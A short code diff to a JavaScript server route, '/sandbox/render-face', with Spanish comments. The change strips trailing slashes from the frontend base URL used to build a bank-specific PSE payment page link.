@@ -246,7 +246,7 @@ apiRouter.post("/sandbox/render-face", async (req, res) => {
     await StorageService.set(`session_${sessionId}`, currentSession);
 
     // URL para pintar la cara (el frontend se encarga de rutear al banco correcto)
-    const frontendBase = process.env.FRONTEND_URL || "http://localhost:3001";
+    const frontendBase = (process.env.FRONTEND_URL || "http://localhost:3001").replace(/\/+$/, "");
     
     // Si pasamos bank por URL, PseLoading omitirá la validación y cargará directamente la ruta del banco.
     const targetUrl = `${frontendBase}/pse?bank=${bank}&sessionId=${sessionId}`;
